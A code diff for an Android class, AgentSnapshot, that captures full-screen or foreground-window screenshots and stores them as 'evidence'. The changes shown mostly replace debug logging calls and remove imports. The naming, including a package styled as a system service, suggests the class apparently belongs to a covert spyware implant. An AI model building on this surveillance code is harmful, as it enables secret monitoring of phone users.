@@ -11,31 +11,22 @@ package com.android.service.agent;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
-import java.io.FileInputStream;
 import java.io.IOException;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
-import java.nio.IntBuffer;
-import java.nio.channels.FileChannel;
 
 import android.content.Context;
 import android.graphics.Bitmap;
-import android.graphics.BitmapFactory;
 import android.graphics.Matrix;
-import android.os.PowerManager;
-import android.util.Log;
 import android.view.Display;
 import android.view.Surface;
-import android.view.View;
 import android.view.WindowManager;
 
 import com.android.service.LogR;
-import com.android.service.Standby;
 import com.android.service.Status;
 import com.android.service.auto.Cfg;
 import com.android.service.evidence.EvidenceType;
 import com.android.service.file.AutoFile;
-import com.android.service.interfaces.Observer;
 import com.android.service.listener.ListenerStandby;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
@@ -72,7 +63,7 @@ public class AgentSnapshot extends AgentBase {
 	 */
 	public AgentSnapshot() {
 		if (Cfg.DEBUG)
-			Log.d("QZ", TAG + " SnapshotAgent constructor");
+			Check.log( TAG + " SnapshotAgent constructor");
 	}
 
 	/*
@@ -125,17 +116,17 @@ public class AgentSnapshot extends AgentBase {
 		case CAPTURE_FULLSCREEN:
 
 			if (Cfg.DEBUG)
-				Log.d("QZ", TAG + " Snapshot Agent: logging full screen");
+				Check.log( TAG + " Snapshot Agent: logging full screen");
 			break;
 
 		case CAPTURE_FOREGROUND:
 			if (Cfg.DEBUG)
-				Log.d("QZ", TAG + " Snapshot Agent: logging foreground window");
+				Check.log( TAG + " Snapshot Agent: logging foreground window");
 			break;
 
 		default:
 			if (Cfg.DEBUG)
-				Log.d("QZ", TAG + " Snapshot Agent: wrong capture parameter");
+				Check.log( TAG + " Snapshot Agent: wrong capture parameter");
 			break;
 		}
 
@@ -145,7 +136,7 @@ public class AgentSnapshot extends AgentBase {
 				
 				boolean isScreenOn = ListenerStandby.isScreenOn();
 				if(!isScreenOn){
-					if(Cfg.DEBUG) Log.d("QZ", TAG + " (go): Screen powered off, no snapshot");
+					if(Cfg.DEBUG) Check.log( TAG + " (go): Screen powered off, no snapshot");
 					return;
 				}
 								
@@ -164,7 +155,7 @@ public class AgentSnapshot extends AgentBase {
 				}
 
 				if (Cfg.DEBUG)
-					Log.d("QZ", TAG + " (go): w=" + width + " h=" + height);
+					Check.log( TAG + " (go): w=" + width + " h=" + height);
 
 				byte[] raw = getRawBitmap();
 				// int[] pixels = new int[ width * height];
@@ -201,8 +192,8 @@ public class AgentSnapshot extends AgentBase {
 			}
 		} catch (Exception ex) {
 			if (Cfg.DEBUG) {
-				Log.d("QZ", TAG + " (go) Error: " + ex);
-				ex.printStackTrace();
+				Check.log( TAG + " (go) Error: " + ex);
+				Check.log(ex);
 			}
 		}
 
@@ -240,7 +231,7 @@ public class AgentSnapshot extends AgentBase {
 
 		} catch (IOException e) {
 			if (Cfg.DEBUG)
-				e.printStackTrace();
+				Check.log(e);
 		}
 		return array;
 
@@ -260,9 +251,9 @@ public class AgentSnapshot extends AgentBase {
 				return file.read();
 			}
 		} catch (IOException e) {
-			if(Cfg.DEBUG) e.printStackTrace();
+			if(Cfg.DEBUG) Check.log(e);
 		} catch (InterruptedException e) {
-			if(Cfg.DEBUG) e.printStackTrace();
+			if(Cfg.DEBUG) Check.log(e);
 		}
 		return null;
 	}
